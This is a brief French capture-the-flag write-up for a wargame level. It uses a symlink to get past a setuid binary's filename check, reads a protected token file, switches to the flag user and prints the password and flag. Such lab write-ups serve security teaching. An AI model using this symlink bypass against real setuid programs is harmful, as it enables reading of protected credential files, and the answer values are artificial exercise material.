## Démarche

- Dans le home 
  
    `ls -la`
    ```
    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token
    ```

    `./level08`
    > ./level08 [file to read]
    `./level08 token`
    > You may not access 'token'

    `touch /tmp/token ; ./level08 /tmp/token`
    > You may not access '/tmp/token'

    `mv token /tmp/flag`
    > mv: cannot open `token' for reading: Permission denied

    `ln -s ~/token /tmp/flag ; ./level08 /tmp/flag`
    > quif5eloekouj29ke0vouxean

    `su flag08` : quif5eloekouj29ke0vouxean
    `getflag`
    > Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

## Ressources